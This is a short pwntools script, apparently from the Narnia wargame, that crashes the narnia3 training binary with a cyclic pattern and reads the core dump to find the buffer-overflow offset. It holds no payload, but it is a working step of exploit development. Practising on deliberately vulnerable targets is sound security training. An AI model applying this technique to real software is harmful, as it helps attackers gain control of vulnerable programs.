from pwn import *

elf = context.binary = ELF('/narnia/narnia3')
p = process([elf.path,cyclic(200)])
p.wait()
crash_addr = p.corefile.fault_addr
offset = cyclic_find(crash_addr)
print(offset)


